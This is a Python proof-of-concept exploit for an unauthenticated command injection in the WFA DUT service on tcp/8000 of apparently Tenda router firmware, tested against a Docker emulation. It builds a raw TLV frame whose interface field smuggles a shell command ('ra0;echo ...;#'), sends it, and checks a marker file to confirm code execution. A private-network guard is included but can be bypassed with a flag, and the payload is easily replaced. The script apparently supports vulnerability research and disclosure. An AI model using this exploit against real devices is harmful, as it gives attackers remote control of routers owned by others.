#!/usr/bin/env python3
"""
PoC: direct WFA DUT command injection without wfa_ca.

This sends a raw WFA TLV frame directly to /sbin/wfa_dut on tcp/8000. The
payload reaches the same sta_get_mac_address interface sink used through
wfa_ca, but does not require the Sigma text-command control agent.
"""

import argparse
import ipaddress
import socket
import struct
import subprocess
import sys
import time


def require_private_host(host, allow_nonlocal):
    ip = ipaddress.ip_address(socket.gethostbyname(host))
    if not allow_nonlocal and not (ip.is_loopback or ip.is_private):
        raise SystemExit(f"refusing non-private target {ip}; pass --allow-nonlocal for authorized testing")


def docker_sh(container, command):
    return subprocess.run(["docker", "exec", container, "/bin/sh", "-c", command], text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout


def docker_out(args):
    return subprocess.run(args, text=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False).stdout.strip()


def discover_container(prefix):
    names = docker_out(["docker", "ps", "--format", "{{.Names}}"]).splitlines()
    matches = [name for name in names if name.startswith(prefix)]
    if not matches:
        raise SystemExit(f"could not find running container with name prefix {prefix!r}; pass --container and --host")
    return matches[0]


def discover_ip(container):
    ip = docker_out(["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", container])
    if not ip:
        raise SystemExit(f"could not discover Docker IP for {container}; pass --host")
    return ip


def firmware_root_expr():
    return 'pid=$(ps | awk \'/[w]fa_dut/{print $1; exit}\'); root=$(readlink /proc/$pid/root); '


def make_frame(interface_payload):
    data = interface_payload.encode()
    if len(data) >= 0x274:
        raise SystemExit("payload too long for sta_get_mac_address TLV")
    payload = data + b"\0" * (0x274 - len(data))
    return struct.pack("<HH", 0x000c, 0x0274) + payload


def send_frame(host, port, frame):
    with socket.create_connection((host, port), timeout=5) as sock:
        sock.sendall(frame)
        sock.settimeout(2)
        try:
            return sock.recv(4096)
        except socket.timeout:
            return b""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default="")
    parser.add_argument("--port", type=int, default=8000)
    parser.add_argument("--container", default="")
    parser.add_argument("--allow-nonlocal", action="store_true")
    args = parser.parse_args()

    if not args.container:
        args.container = discover_container("tenda-b104-rcd-procd")
    if not args.host:
        args.host = discover_ip(args.container)

    require_private_host(args.host, args.allow_nonlocal)
    marker = "/tmp/direct_8000"
    docker_sh(args.container, firmware_root_expr() + f'rm -f "$root{marker}"')

    injected_interface = f"ra0;echo DIRECT8000>{marker};#"
    frame = make_frame(injected_interface)
    response = send_frame(args.host, args.port, frame)
    time.sleep(0.5)
    marker_value = docker_sh(args.container, firmware_root_expr() + f'cat "$root{marker}" 2>/dev/null || true').strip()
    vulnerable = marker_value == "DIRECT8000"

    print(f"[target] {args.host}:{args.port} container={args.container}")
    print("[exploit] raw little-endian TLV tag=0x000c len=0x0274")
    print("[payload] " + injected_interface)
    print("[response_hex] " + response[:64].hex())
    print("[validation] " + marker)
    print("  marker=" + repr(marker_value))
    print("  vulnerable=" + str(vulnerable))
    if vulnerable:
        print("  cvss evidence: AV:N/AC:L/PR:N/UI:N/C:H/I:H/A:H candidate if wfa_dut tcp/8000 is reachable")
    sys.exit(0 if vulnerable else 1)


if __name__ == "__main__":
    main()
